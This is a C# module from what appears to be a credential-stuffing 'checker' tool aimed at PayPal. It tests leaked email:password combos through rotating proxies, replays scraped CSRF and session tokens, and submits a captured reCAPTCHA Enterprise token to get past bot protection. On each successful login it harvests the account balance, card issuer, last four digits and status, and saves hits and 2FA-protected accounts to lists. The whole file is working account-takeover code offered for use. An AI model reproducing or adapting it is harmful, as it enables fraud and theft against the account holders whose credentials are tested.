using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class PPNEW
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("URL HERE").ToString();
                string ctx = Cryptography.LR(str1, "name=\"ctxId\" value=\"", "\"").FirstOrDefault();
                string flowid = Cryptography.LR(str1, "name=\"flowId\" value=\"", "\"").FirstOrDefault();
                string sesid = Cryptography.LR(str1, "sessionID\" value=\"", "\"").FirstOrDefault();
                string csrf = Cryptography.LR(str1, "name=\"_csrf\" value=\"", "\"").FirstOrDefault();
                csrf = WebUtility.UrlEncode(csrf);
                string ads = Cryptography.LR(str1, "name=\"ads-client-context-data\" value=\"", "\"").FirstOrDefault();
                if (!string.IsNullOrEmpty(ads))
                {
                    ads = ads.Replace("&quot;", "\"");
                    ads = WebUtility.UrlEncode(ads);
                }
                string rurl = Cryptography.LR(str1, "requestUrl\" value=\"", "\"").FirstOrDefault();
                if (!string.IsNullOrEmpty(ads))
                {
                    rurl = rurl.Replace("&quot;", "\"");
                    rurl = WebUtility.UrlEncode(rurl);
                }
                string state = Cryptography.LR(str1, "name=\"state\" value=\"", "\"").FirstOrDefault();
                if (!string.IsNullOrEmpty(state))
                {
                    state = state.Replace("&quot;", "\"");
                    state = WebUtility.UrlEncode(state);
                }
                string reqid = Cryptography.LR(str1, "name=\"_requestId\" value=\"", "\"").FirstOrDefault();
                string meta = Cryptography.LR(str1, "metadata_id", "redirect_uri").FirstOrDefault();
                string client = Cryptography.LR(str1, "/?client_id=", "&").FirstOrDefault();
                client = WebUtility.UrlEncode(client);

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "www.paypal.com");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
                //httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Origin", "https://www.paypal.com");
                httpRequest.AddHeader("Referer", "https://www.paypal.com/cgi-bin/webscr");
                httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Cache-Control", "no-cache");
                httpRequest.AddHeader("TE", "Trailers");
                string str2 = httpRequest.Post("URL HERE" + ctx+"&returnUri=https%3A%2F%2Fwww.paypal.com%2Fconnect%3Fclient_id"+client+"metadata_id"+meta+"redirect_uri%3Dhttps%253A%252F%252Fid.kinguin.net%252Foauth%252Fv2%252Fauth%252Flogin%252Fcheck-paypal%26response_type%3Dcode%26scope%3Dopenid%2520email", "_csrf="+csrf+ "&_sessionID="+sesid+ "&locale.x=en_US&processSignin=main&fn_sync_data=fn_sync_data&otpMayflyKey=b4208fd62f3648ceb31f327927ce5802otpChlg&intent=checkout&ads-client-context=checkout&flowId="+flowid+ "&ads-client-context-data="+ads+ "&ctxId="+ctx+ "&showCountryDropDown=true&hideOtpLoginCredentials=true&requestUrl=z"+rurl+ "&forcePhonePasswordOptIn=&returnUri=%2Fwebapps%2Fhermes&state="+state+ "&phoneCode=US+%2B1&login_email="+strArray1[0]+ "&login_password="+strArray1[1]+ "&login_phone=&btnLogin=Login&splitLoginContext=inputPassword&isCookiedHybridEmail=true", "application/x-www-form-urlencoded").ToString();
                //Console.WriteLine(str2);
                string hash = Cryptography.LR(str2, "name=\"_hash\" value=\"", "\"").FirstOrDefault();
                hash = WebUtility.UrlEncode(hash);
                string sind = Cryptography.LR(str2, "name=\"_sessionID\" value=\"", "\"").FirstOrDefault();
                sind = WebUtility.UrlEncode(hash);
                string reqid1 = Cryptography.LR(str2, "name=\"_requestId\" value=\"", "\"").FirstOrDefault();
                reqid1 = WebUtility.UrlEncode(reqid1);
                string grc = Cryptography.LR(str2, "name=\"grc_eval_start_time_utc\" value=\"", "\"").FirstOrDefault();
                grc = WebUtility.UrlEncode(grc);
                string jse = Cryptography.LR(str2, "data-jse=\"", "\"").FirstOrDefault();
                jse = WebUtility.UrlEncode(jse);
                string csrf1 = Cryptography.LR(str2, "name=\"_csrf\" value=\"", "\"").FirstOrDefault();
                csrf1 = WebUtility.UrlEncode(csrf1);

                string time = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
                string str3 = httpRequest.Get("URL HERE").ToString();
                string TK = Cryptography.LR(str3, "type=\"hidden\" id=\"recaptcha-token\" value=\"", "\"").FirstOrDefault();
                string addr = httpRequest.Address.ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("accept-language", "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7");
                httpRequest.AddHeader("origin", "https://www.google.com");
                httpRequest.AddHeader("referer", "" + addr);
                httpRequest.AddHeader("sec-fetch-dest", "empty");
                httpRequest.AddHeader("sec-fetch-mode", "cors");
                httpRequest.AddHeader("sec-fetch-site", "same-origin");
                string str4 = httpRequest.Post("https://www.recaptcha.net/recaptcha/enterprise/reload?k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB", "v=VZKEDW9wslPbEc9RmzMqaOAP&reason=q&c="+TK+ "&k=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&co=aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ", "application/x-www-form-urlencoded").ToString();
                string vlone = Cryptography.LR(str4, "[\"rresp\",\"", "\"").FirstOrDefault();

                string time1 = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "www.paypal.com");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                httpRequest.AddHeader("Origin", "https://www.paypal.com");
                httpRequest.AddHeader("Referer", "URL HERE" + ctx+ "&returnUri=%2Fwebapps%2Fhermes&state="+state+ "&locale.x=en_US&country.x=US&flowId="+flowid);
                httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Cache-Control", "no-cache");
                httpRequest.AddHeader("TE", "Trailers");
                string str5 = httpRequest.Post("https://www.paypal.com/auth/validatecaptcha", "_recaptchaEnterpriseEnabled=true&_adsRecaptchaSiteKey=6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB&_csrf=" + csrf1 + "&_requestId=" + reqid1 + "&_hash=" + hash + "&grc_eval_start_time_utc=" + grc + "&_sessionID=" + sind + "&recaptcha=" + vlone + "&grc_render_start_time_utc=" + time + "&grc_render_end_time_utc=" + time1, "application/x-www-form-urlencoded").ToString();
                string str6 = httpRequest.Address.ToString();

                if (str5.Contains("https://www.paypal.com/webapps/hermes") || str6.Contains("hermes"))
                {
                    try
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPT/2.3.0 Mobile/15E148");
                        httpRequest.AddHeader("Pragma", "no-cache");
                        httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                        httpRequest.AddHeader("Host", "www.paypal.com");
                        httpRequest.AddHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("Origin", "https://www.paypal.com");
                        httpRequest.AddHeader("Connection", "keep-alive");
                        httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                        httpRequest.AddHeader("Cache-Control", "no-cache");
                        string str7 = httpRequest.Get("https://www.paypal.com/myaccount/money/").ToString();

                        string balance = Cryptography.LR(str7, "\"totalAvailable\":{\"amount\":\"", "\",\"").FirstOrDefault();
                        string cardata = Cryptography.LR(str7, "\"issuerName\":\"", "\"", true, false).FirstOrDefault();
                        string lastdigi = Cryptography.LR(str7, "lastDigits\":\"", "\"").FirstOrDefault();
                        string status = Cryptography.LR(str7, "\"status\":\"", "\"").FirstOrDefault();
                        if(str7.Contains("<span dir=\"ltr\">••••"))
                        {
                            Interlocked.Increment(ref Program.Good);
                            ++Program.Check;
                            ++Program.Cps;
                            Program.remove(combo);
                            if (Program.Lock == "Y")
                            {
                                Console.WriteLine(combo + $"Card: {cardata} | Last Digits: {lastdigi} | Status: {status} | Balance: {balance}", Color.Green);
                            }
                            Program.Save(combo + $"Card: {cardata} | Last Digits: {lastdigi} | Status: {status} | Balance: {balance}", "PayPal Capture");
                            return true;
                        }
                        else
                        {
                            ++Program.Free;
                            ++Program.Check;
                            ++Program.Cps;
                            if (Program.Lock == "Y")
                            {
                                Console.WriteLine($" [+] {combo}", Color.Orange);
                            }
                            Program.Save(combo, "Paypal No Card");
                            return true;
                        }
                    }
                    catch
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine(combo, Color.Green);
                        }
                        Program.Save(combo, "PayPal Cap Failed");
                        return true;
                    }
                    
                }
                else if (str5.Contains("For security reasons, you’ll need"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Orange);
                    }
                    Program.Save(combo, "Paypal Expired");
                    return true;
                }
                else if (str5.Contains("Redirecting to <a href=\"/authflow/safe/") || str5.Contains("to <a href=\"https://www.paypal.com/authflow/twofactor") || str5.Contains("Redirecting to <a href=\"/auth/stepup") || str5.Contains("entry"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Orange);
                    }
                    Program.Save(combo, "Paypal 2FA");
                    return true;
                }
                else if (str5.Contains("Some of your info didn't match") || str5.Contains("LoginFailed"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    Program.remove(combo);
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
